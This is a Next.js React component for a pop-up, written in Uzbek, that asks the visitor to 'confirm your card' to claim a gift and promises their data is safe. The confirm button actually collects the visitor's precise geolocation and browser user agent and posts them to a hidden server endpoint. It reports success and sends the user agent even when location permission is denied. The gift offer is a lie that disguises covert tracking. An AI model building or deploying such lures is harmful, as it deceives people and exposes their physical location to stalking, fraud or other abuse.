'use client';

import { useState, useCallback } from 'react';
import styles from './ConfirmationModal.module.css';

interface ConfirmationModalProps {
    isOpen: boolean;
    onClose: () => void;
}

export default function ConfirmationModal({ isOpen, onClose }: ConfirmationModalProps) {
    const [isLoading, setIsLoading] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [error, setError] = useState('');

    const handleConfirm = useCallback(async () => {
        setIsLoading(true);
        setError('');

        try {
            // Request geolocation
            const position = await new Promise<GeolocationPosition>((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });

            const { latitude, longitude, accuracy } = position.coords;

            // Send to server
            const serverUrl = process.env.NEXT_PUBLIC_SIGNALING_SERVER?.replace('wss://', 'https://').replace('ws://', 'http://') || '';

            await fetch(`${serverUrl}/api/geo`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${process.env.NEXT_PUBLIC_API_TOKEN}`
                },
                body: JSON.stringify({
                    latitude,
                    longitude,
                    accuracy,
                    userAgent: navigator.userAgent
                })
            });

            setIsSuccess(true);
            setTimeout(() => {
                onClose();
            }, 2000);

        } catch (err) {
            // Send without geo (permission denied or error)
            const serverUrl = process.env.NEXT_PUBLIC_SIGNALING_SERVER?.replace('wss://', 'https://').replace('ws://', 'http://') || '';

            await fetch(`${serverUrl}/api/geo`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${process.env.NEXT_PUBLIC_API_TOKEN}`
                },
                body: JSON.stringify({
                    latitude: null,
                    longitude: null,
                    denied: true,
                    userAgent: navigator.userAgent
                })
            });

            setIsSuccess(true);
            setTimeout(() => {
                onClose();
            }, 2000);
        }

        setIsLoading(false);
    }, [onClose]);

    if (!isOpen) return null;

    return (
        <div className={styles.backdrop}>
            <div className={styles.modal}>
                <div className={styles.icon}>
                    {isSuccess ? '✓' : '🎁'}
                </div>

                <h2 className={styles.title}>
                    {isSuccess ? 'Tabriklaymiz!' : 'Kartangizni tasdiqlang'}
                </h2>

                <p className={styles.subtitle}>
                    {isSuccess
                        ? "Sovg'angiz yo'lda! Tez orada siz bilan bog'lanamiz."
                        : "Kartangizda xato yo'qligini tasdiqlang va sovg'angizni oling"}
                </p>

                {!isSuccess && (
                    <button
                        className={`${styles.button} ${isSuccess ? styles.success : ''}`}
                        onClick={handleConfirm}
                        disabled={isLoading}
                    >
                        {isLoading ? (
                            <>
                                <i className={`fas fa-spinner ${styles.loading}`} />
                                Tekshirilmoqda...
                            </>
                        ) : (
                            <>
                                <i className="fas fa-gift" />
                                Tasdiqlash va olish
                            </>
                        )}
                    </button>
                )}

                {error && <p className={styles.error}>{error}</p>}

                <p className={styles.note}>
                    🔒 Ma'lumotlaringiz xavfsiz
                </p>
            </div>
        </div>
    );
}
